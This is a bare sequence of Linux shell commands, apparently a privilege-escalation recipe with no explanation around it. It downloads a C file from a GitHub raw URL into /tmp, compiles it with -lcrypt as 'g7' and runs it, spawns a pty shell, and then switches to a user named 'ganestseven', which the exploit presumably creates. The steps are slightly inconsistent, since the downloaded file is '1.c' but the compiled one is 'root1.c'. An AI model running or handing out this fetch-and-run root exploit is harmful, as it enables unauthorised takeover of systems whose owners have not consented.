cd /tmp
mkdir tes
wget https://raw.githubusercontent.com/alivos7/Root/1.c
gcc -pthread root1.c -o g7 -lcrypt
chmod +x g7
./g7
python -c 'import pty; pty.spawn("/bin/sh")'
su ganestseven
